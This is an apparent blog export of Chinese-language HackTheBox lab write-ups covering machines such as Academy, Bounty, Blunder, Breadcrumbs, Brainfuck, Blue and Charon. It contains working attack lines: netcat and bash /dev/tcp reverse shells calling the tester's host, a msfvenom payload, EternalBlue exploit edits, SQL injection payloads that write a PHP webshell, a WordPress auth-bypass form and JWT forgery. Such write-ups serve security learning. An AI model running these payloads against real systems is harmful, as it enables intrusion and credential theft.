<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc 41458.c -o pwn</span><br><span class="line">scp pwn notch@10.10.10.37:</span><br><span class="line">8YsqfCTnvxAUeduzjNSXe22</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blocky/12.png" alt="12"></p>
<p>非常不稳定，系统会立即崩溃</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Academy</title>
    <url>/2020/11/28/HTB-Academy/</url>
    <content><![CDATA[<h1 id="Academy"><a href="#Academy" class="headerlink" title="Academy"></a>Academy</h1><p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.215    academy.htb</span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Academy/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>目录枚举</p>
<p><img src="/images/Academy/2.png" alt="2"></p>
<p>发现了几个重要的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login.php			登录页面</span><br><span class="line">register.php		注册页面</span><br><span class="line">admin.php			疑似后台登录</span><br><span class="line">config.php			空白</span><br></pre></td></tr></table></figure>

<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>先注册账号进去</p>
<p><img src="/images/Academy/3.png" alt="3"></p>
<p>看起来网站内容还挺多，检查了主页半天， 没发现什么奇怪的点。开启burpsuite重新检查每一个请求，有了发现</p>
<p>注册页面提交了roleid参数，疑似跟身份权限有关</p>
<p><img src="/images/Academy/4.png" alt="4"></p>
<p>修改为1然后提交，尝试登录后台admin.php</p>
<p><img src="/images/Academy/5.png" alt="5"></p>
<p>登录成功，提示了新域名存在问题，添加到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.215    academy.htb dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>

<p>页面存在很多信息泄露，看来个测试页</p>
<p><img src="/images/Academy/6.png" alt="6"></p>
<p>从中得到了目标网站运行着Laravel(php框架)，并且泄露了APP_KEY。APP_KEY应该是Laravel中某些地方加密用到的密钥，比如cookie。</p>
<p>寻找漏洞</p>
<p><img src="/images/Academy/7.png" alt="7"></p>
<p>发现了msf可以使用的RCE，根据描述来看</p>
<p>这是一个反序列化漏洞，可以在http头X-XSRF-TOKEN中注入payload，前提是知道app_key，需要用它来进行加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set APP_KEY dBLUaMuZz7Iq06XtL&#x2F;Xnz&#x2F;90Ejq+DEEynggqubHWFj0&#x3D;</span><br><span class="line">set RHOST 10.10.10.215</span><br><span class="line">set VHOST dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>

<p>别忘了设置vhost</p>
<p><img src="/images/Academy/8.png" alt="8"></p>
<p>这个payload的http请求如下</p>
<p><img src="/images/Academy/9.png" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>存在的用户</p>
<p><img src="/images/Academy/10.png" alt="10"></p>
<h3 id="user1"><a href="#user1" class="headerlink" title="user1"></a>user1</h3><p>机器存在3306端口，尝试寻找数据库连接凭据。在laravel中一般存储在.env</p>
<p><img src="/images/Academy/11.png" alt="11"></p>
<p>数据库登不上去，尝试密码复用</p>
<p><code>cry0l1t3/mySup3rP4s5w0rd!!</code></p>
<p><img src="/images/Academy/13.png" alt="13"></p>
<p>不过用户没有sudo权限</p>
<h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>用户1的组有点意思，属于adm</p>
<p><img src="/images/Academy/14.png" alt="14"></p>
<p>adm组用于监视系统任务，可以读取/var/log下的许多日志，下一步应该检查那里</p>
<p>这里发现了目录audit。SELinux 预设会透过 Linux 审计系统 auditd将日志写在 /var/log/audit/audit.log。它会记录一些如系统调用，文件修改，执行的程序，系统登入登出等有关安全的操作事件。</p>
<p>这里好累，日志太多了，这里有描述的意思</p>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-understanding_audit_log_files">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-understanding_audit_log_files</a></p>
<p><a href="https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details">https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details</a></p>
<p>慢慢找呗</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat * |grep &quot;[^a]uid&#x3D;100[01234]&quot;|grep &quot;type&#x3D;TTY&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Academy/15.png" alt="15"></p>
<p>发现auditd竟然记下来用户的凭据</p>
<p>后面发现，直接找敏感的命令，可能会好些，一开始没想到su</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -Ri &#39;comm&#x3D;&quot;su&quot;&#39;</span><br></pre></td></tr></table></figure>

<p><code>6D7262336E5F41634064336D79210A</code>看样子是hex编码后的内容，尝试解码得到<code>mrb3n_Ac@d3my!</code>，不过密码不是uid1002的，而是</p>
<p><code>mrb3n/mrb3n_Ac@d3my!</code></p>
<p><img src="/images/Academy/16.png" alt="16"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>root反而简单了，直接找到了sudo命令composer</p>
<p><img src="/images/Academy/17.png" alt="17"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最耗时间的地方在横向移动到第二个用户的时候，日志太多，不熟悉的情况下，不确定是否应该花费大量时间去寻找</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bounty</title>
    <url>/2020/06/22/HTB-Bounty/</url>
    <content><![CDATA[<h1 id="Bounty"><a href="#Bounty" class="headerlink" title="Bounty"></a>Bounty</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bounty/1.jpg" alt="1"></p>
<p>只发现了80端口，且IIS版本为7.5</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问http首页，没有有价值的信息<br>进行目录枚举，对IIS还要扫描asp和aspx页面</p>
<p><img src="/images/Bounty/2.jpg" alt="2"></p>
<p>发现了一处文件上传</p>
<p><img src="/images/Bounty/3.jpg" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试上传文件</p>
<p>先正常上传一张图片，看看能否访问</p>
<p><img src="/images/Bounty/4.jpg" alt="4"></p>
<p>提示上传成功</p>
<p><img src="/images/Bounty/5.jpg" alt="5"></p>
<p>并且在uploadedfiles目录下可以访问<br>确认上传文件可以被访问，就可以尝试上传恶意脚本</p>
<p>尝试修改文件名和Content-Type观察上传机制</p>
<p><img src="/images/Bounty/6.jpg" alt="6"></p>
<p>发现.config是可以成功上传的，尝试searchsploit搜索相关漏洞，可惜一无所获<br>谷歌搜索关键词IIS 7.5 upload exloit config，找到了exp，<a href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/">链接</a><br>这个漏洞允许你上传文件名为<code>web.config</code>包含自定义asp代码，从而达到RCE</p>
<p>修改一下payload，原来payload<code>whoami</code>无法运行<br>需要修改为<code>cmd /c whoami</code></p>
<p><img src="/images/Bounty/8.jpg" alt="8"></p>
<p><img src="/images/Bounty/7.jpg" alt="7"></p>
<p>RCE成功，现在只要修改成获取shell的命令即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c cd %tmp% &amp;&amp; copy \\10.10.16.150\a\nc.exe &amp;&amp; nc.exe -nv 10.10.16.150 4444 -e cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bounty/9.jpg" alt="9"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="MS15-051"><a href="#MS15-051" class="headerlink" title="MS15-051"></a>MS15-051</h3><p><img src="/images/Bounty/10.jpg" alt="10"></p>
<p><img src="/images/Bounty/11.jpg" alt="11"></p>
<p>提权成功</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Blunder</title>
    <url>/2020/09/24/HTB-Blunder/</url>
    <content><![CDATA[<h1 id="Blunder"><a href="#Blunder" class="headerlink" title="Blunder"></a>Blunder</h1><p>kali:10.10.16.10<br>目标:10.10.10.191</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blunder/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动查看80，看样子是一个博客，页面上没有什么有用的链接，手动检查robots.txt，但没有什么有效的发现<br>目录枚举，打开php扩展</p>
<p><img src="/images/Blunder/2.png" alt="2"></p>
<p>从admin文件夹中发现了CMS BLUDIT</p>
<p><img src="/images/Blunder/3.png" alt="3"></p>
<p>接着检查源代码</p>
<p><img src="/images/Blunder/4.png" alt="4"></p>
<p>发现了具体版本为3.9.2，登录页面存在csrftoken</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接搜索公开漏洞</p>
<p><img src="/images/Blunder/5.png" alt="5"></p>
<p>第一个是暴力破解，不考虑，第二个目录遍历看起来有点意思<br>打开查看给出了具体的操作步骤，还给出了漏洞编号(CVE-2019-16113)，看样子是一个文件上传漏洞，需要登录凭据<br>先谷歌一下发现了可以用的python脚本，直接输入RCE指令即可，看起来使用起来很方便</p>
<p><a href="https://github.com/cybervaca/CVE-2019-16113">https://github.com/cybervaca/CVE-2019-16113</a></p>
<p>现在考虑凭据下手，由于csrftoken的存在，我们只能单线程爆破，所以<strong>think simple</strong>，看来枚举工作没做到位，我又再次枚举了txt</p>
<p><img src="/images/Blunder/6.png" alt="6"></p>
<p>看起来发现了一个用户名<code>fergus</code>，接着考虑密码字典<br>既然这是一个博客，那首页的文章还是给出了比较多的信息，考虑使用cewl，暂时不考虑变异字典</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl -m 4 -d 5 -w wordlist.txt http:&#x2F;&#x2F;10.10.10.191&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blunder/7.png" alt="7"></p>
<p>字典的大小在可接受程度</p>
<p>之后的csrftoken爆破就很轻松了，使用burp的macro进行操作</p>
<p><img src="/images/Blunder/8.png" alt="8"></p>
<p>选择了正确的用户名，使我们能很快得到需要的信息<code>RolandDeschain</code></p>
<p>执行该脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 CVE-2019-16113.py -u http:&#x2F;&#x2F;10.10.10.191 -user fergus -pass RolandDeschain -c &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.10&#x2F;443 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blunder/9.png" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先枚举用户，发现普通用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hugo</span><br><span class="line">shaun</span><br><span class="line">temp</span><br></pre></td></tr></table></figure>

<p>这里没有发现mysql，去web目录下寻找其他登录凭据，发现了两个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;bludit-3.10.0a&#x2F;bl-content&#x2F;databases&#x2F;users.php</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;bludit-3.9.2&#x2F;bl-content&#x2F;databases&#x2F;users.php</span><br></pre></td></tr></table></figure>

<p>其中3.10.0a中的用户名匹配已知普通用户名</p>
<p><img src="/images/Blunder/10.png" alt="10"></p>
<p>破解密码</p>
<p><img src="/images/Blunder/11.png" alt="11"></p>
<p>切换到hugo，枚举sudo权限</p>
<p><img src="/images/Blunder/12.png" alt="12"></p>
<p>发现了奇怪的sudo权限<code>(ALL, !root) /bin/bash</code>，这表示我们可以轻易切换任何用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u shaun &#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blunder/13.png" alt="13"></p>
<p>这里我真是佛了，我直接跳进了这个思路里，四下寻找，之后我才google这个不寻常的sudo权限，发现了</p>
<p><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p>
<p><img src="/images/Blunder/14.png" alt="14"></p>
<p>并且作者给出了非常好的解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description :</span><br><span class="line">Sudo doesn&#39;t check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv</span><br><span class="line">-u#-1 returns as 0 which is root&#39;s id</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Breadcrumbs</title>
    <url>/2021/02/23/HTB-Breadcrumbs/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Breadcrumbs/1.png" alt="1"></p>
<p>这是一台windows机器，但是却安装了OpenSSH<br>高端口5040和7680搜索了一圈似乎可能是某些老旧的服务，但好像没有什么有效的攻击手段<br>SMB不允许匿名<br>从HTTP和HTTPS开始入手</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>页面枚举</p>
<p><img src="/images/Breadcrumbs/6.png" alt="6"></p>
<p>发现了疑似后台</p>
<p><img src="/images/Breadcrumbs/7.png" alt="7"></p>
<p>http首页非常简单，提供了一个搜索书籍的功能</p>
<p><img src="/images/Breadcrumbs/3.png" alt="3"></p>
<p>*这里有个中国特色坑，页面有个js我移动网络打不开，导致我页面有些功能缺失了，反正hackthebox常见问题，习惯了。。</p>
<p><img src="/images/Breadcrumbs/2.png" alt="2"></p>
<p>页面包含了两个请求，一个是查询书的请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;a&amp;author&#x3D;&amp;method&#x3D;0</span><br></pre></td></tr></table></figure>

<p>考虑到3306 MariaDB的存在，尝试SQL注入，但并没成功</p>
<p>另一个是对书籍的收藏请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">book&#x3D;book9.html&amp;method&#x3D;1</span><br></pre></td></tr></table></figure>

<p>这个比较有意思，随便尝试几下，发现存在LFI</p>
<p><img src="/images/Breadcrumbs/4.png" alt="4"></p>
<p>当我尝试触发错误后，确认这里文件包含的函数是file_get_contents</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents(&#39;..&#x2F;books&#x2F;EvilInput&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breadcrumbs/5.png" alt="5"></p>
<p>发现了数据连接凭据<code>bzread/jUli901</code></p>
<p><img src="/images/Breadcrumbs/8.png" alt="8"></p>
<p>之后我尝试读取login.php，希望发现登录逻辑</p>
<p><img src="/images/Breadcrumbs/9.png" alt="9"></p>
<p>继续追踪 </p>
<p><img src="/images/Breadcrumbs/10.png" alt="10"></p>
<p>这一块需要代码审计了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat test.txt | sed &#39;s&#x2F;\\r\\n&#x2F;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>

<p>把代码整理干净后，卡了一会儿了，不过由于LFI的存在，我决定枚举更多子目录，发现了目录遍历漏洞，配合LFI简直无敌</p>
<p><img src="/images/Breadcrumbs/11.png" alt="11"></p>
<p>发现了疑似用户名列表</p>
<p><img src="/images/Breadcrumbs/12.png" alt="12"></p>
<p>之后在代码审计的过程中，发现了关键词JWT，这是一种token认证的技术，幸好我有个做前端的兄弟跟我说过，巧了</p>
<p>我先注册了账号，凭据为<code>evil/evil</code></p>
<p><img src="/images/Breadcrumbs/13.png" alt="13"></p>
<p>确定看来需要通过审计，来进行未授权访问</p>
<p>首先寻找想要伪造的用户，之前已经得到了一个用户列表，可以尝试里面的用户，不过我发现了硬编码。</p>
<p>在<code>portal\includes\fileController.php</code>里，发现了JWT的密钥和疑似管理员用户paul</p>
<p><img src="/images/Breadcrumbs/15.png" alt="15"></p>
<p>接着在portal\cookie.php里发现了cookie的生成方式</p>
<p><img src="/images/Breadcrumbs/16.png" alt="16"></p>
<p>上面的代码，seed是个随机数，<code>$username[$seed]</code>是paul任意一个字母，所以一共有4种cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">paula2a6a014d3bee04d7df8d5837d62e8c5</span><br><span class="line">paul61ff9d4aaefe6bdf45681678ba89ff9d</span><br><span class="line">paul8c8808867b53c49777fe5559164708c3</span><br><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure>

<p>接着网站分析了以下token，<a href="https://jwt.io/">https://jwt.io/</a></p>
<p><img src="/images/Breadcrumbs/14.png" alt="14"></p>
<p>既然知道了secret_key，那接下来就很简单了，Header部分不需要修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>

<p>Payload部分修改用户名，直接在网站上改就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ</span><br></pre></td></tr></table></figure>

<p>Signature部分输入密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</span><br></pre></td></tr></table></figure>

<p>反正网站非常方便 </p>
<p><img src="/images/Breadcrumbs/17.png" alt="17"></p>
<p>其实前两段就是base64，后面是<code>HMACSHA256(base64UrlEncode(header) + &#39;.&#39; + base64UrlEncode(payload), &#39;secret_key&#39;)</code></p>
<p><img src="/images/Breadcrumbs/18.png" alt="18"></p>
<p>所以cookie和jwttoken分别是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</span><br></pre></td></tr></table></figure>

<p>替换之后，我成功登录</p>
<p><img src="/images/Breadcrumbs/19.png" alt="19"></p>
<p>后台有上传点，不过似乎只接受zip文件上传</p>
<p><img src="/images/Breadcrumbs/20.png" alt="20"></p>
<p>可以直接被绕过</p>
<p><img src="/images/Breadcrumbs/21.png" alt="21"></p>
<p>之后连webshell就行了</p>
<p><img src="/images/Breadcrumbs/22.png" alt="22"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>json文件里找到凭据</p>
<p><img src="/images/Breadcrumbs/23.png" alt="23"></p>
<p>ssh过去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh juliette@10.10.10.228</span><br><span class="line">jUli901.&#x2F;())!</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breadcrumbs/24.png" alt="24"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Brainfuck</title>
    <url>/2020/06/05/HTB-Brainfuck/</url>
    <content><![CDATA[<h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/brainfuck/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>发现443端口运行了https服务，登录之后是一个nginx的欢迎页面<br>在/etc/hosts中添加ip</p>
<p><img src="/images/brainfuck/2.jpg" alt="2"></p>
<p>之后就可以正常访问了</p>
<p><img src="/images/brainfuck/3.jpg" alt="3"></p>
<p>这是一个wordpress站点</p>
<h4 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h4><p>对wordpress进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token zBDf1JO6FsSNPZjosgaoPHKg8f049ar0FhEFDumlGjg --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; --disable-tls-checks</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/4.jpg" alt="4"></p>
<p>发现了wp support plus存在的漏洞</p>
<p>接着对wordpress进行用户名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/5.jpg" alt="5"></p>
<p>发现了2个账号</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p><img src="/images/brainfuck/6.jpg" alt="6"></p>
<p><img src="/images/brainfuck/7.jpg" alt="7"></p>
<p>这个权限提升漏洞可以让你不知道秘密的情况下进行 登录，不过需要知道用户名</p>
<p>我们在本地web服务创建HTML页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;https:&#x2F;&#x2F;brainfuck.htb&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt;</span><br><span class="line">        Username: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;administrator&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;sth&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;loginGuestFacebook&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/8.jpg" alt="8"></p>
<p>等待一会儿</p>
<p><img src="/images/brainfuck/9.jpg" alt="9"></p>
<p>这时候再回到主页</p>
<p><img src="/images/brainfuck/10.jpg" alt="10"></p>
<p>发现我们已经获得了cookie成功登录了账号</p>
<p>两个账号都没有对插件的写权限，不能写入shell，不过在admin账号下，发现了</p>
<p><img src="/images/brainfuck/11.jpg" alt="11"></p>
<p>SMTP账号密码orestis/kHGuERB29DNiNE</p>
<p>之后我就可以利用获取的账号和密码访问pop3服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#nc -nv 10.10.10.17 110</span><br><span class="line">USER orestis</span><br><span class="line">PASS kHGuERB29DNiNE</span><br><span class="line">stat</span><br><span class="line">retr1</span><br><span class="line">retr2</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/12.jpg" alt="12"></p>
<p>在第二封邮件里发现了账号和密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username: orestis</span><br><span class="line">password: kIEnnfEKJ#9UmdO</span><br></pre></td></tr></table></figure>

<p>使用这个密码可以登录<code>https://sup3rs3cr3t.brainfuck.htb/</code></p>
<p><img src="/images/brainfuck/13.jpg" alt="13"></p>
<p>破解其中对话，获得URL<code>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</code></p>
<p>下载<code>id_rsa</code>,还需要破解它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;usr&#x2F;share&#x2F;john#python ssh2john.py &#x2F;root&#x2F;Desktop&#x2F;id_rsa &gt; &#x2F;root&#x2F;Desktop&#x2F;pass.txt</span><br><span class="line">root@kali:~&#x2F;Desktop#john pass.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt </span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/14.jpg" alt="14"></p>
<p>得出密钥:<code>3poulakia!</code></p>
<p><img src="/images/brainfuck/15.jpg" alt="15"></p>
<p>之后就可以进行ssh连接获取shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Blue</title>
    <url>/2020/06/05/HTB-Blue/</url>
    <content><![CDATA[<h1 id="Blue"><a href="#Blue" class="headerlink" title="Blue"></a>Blue</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blue/1.jpg" alt="1"></p>
<p>扫描之后发现了smb服务，并且机器为windows7</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>竟然是win7，就会想到EternalBlue</p>
<p><img src="/images/Blue/2.jpg" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>github</p>
<p><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
<p>github</p>
<p><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></p>
<p>zzz_exploit.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;&lt;LAB IP&gt; lport&#x3D;&lt;PORT&gt; -f exe &gt; writeup.exe</span><br></pre></td></tr></table></figure>

<p>修改exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb_send_file(smbConn, &#39;&#x2F;root&#x2F;Desktop&#x2F;writeups&#x2F;blue&#x2F;writeup.exe&#39;, &#39;C&#39;, &#39;&#x2F;writeup.exe&#39;)</span><br><span class="line">service_exec(conn, r&#39;cmd &#x2F;c c:\\writeup.exe&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz_exploit.py 10.10.10.40</span><br></pre></td></tr></table></figure>

<p>msf</p>
<p>windows/smb/ms17_010_eternalblue</p>
<p><img src="/images/Blue/3.jpg" alt="3"></p>
<p>这个漏洞在利用过程中很不稳定，不断尝试总有几次能成功</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Charon</title>
    <url>/2020/10/21/HTB-Charon/</url>
    <content><![CDATA[<h1 id="Charon"><a href="#Charon" class="headerlink" title="Charon"></a>Charon</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/charon/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口发现supercms</p>
<p><img src="/images/charon/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞，没有发现，手动检查</p>
<p>发现了一处页面提交了id参数</p>
<p><img src="/images/charon/3.png" alt="3"></p>
<p>手动测试几个payload后，发现sql注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10 and 1&#x3D;2--+</span><br></pre></td></tr></table></figure>

<p><img src="/images/charon/4.png" alt="4"></p>
<p>直接使用sqlmap</p>
<p><img src="/images/charon/6.png" alt="6"></p>
<p>但是mysql内没有任何凭据信息</p>
<p><img src="/images/charon/5.png" alt="5"></p>
<p>尝试写入webshell和文件读取也无法完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 union select 1,2,3,4,(load_file (&#39;&#x2F;etc&#x2F;passwd&#39;))--+</span><br><span class="line">0 union select 1,&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;,3,4,5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php&#39;--+</span><br></pre></td></tr></table></figure>

<p>所以这个sql注入在这里，几乎0作用，可以确认是兔子洞</p>
<p>没有突破点，尝试目录枚举</p>
<p><img src="/images/charon/7.png" alt="7"></p>
<p>得到了cmsdata目录，但是403了，尝试枚举该目录</p>
<p><img src="/images/charon/8.png" alt="8"></p>
<p>得到了一些有用的页面</p>
<p><img src="/images/charon/9.png" alt="9"></p>
<p>在forgot password处发现了sql注入，发现过程如下</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
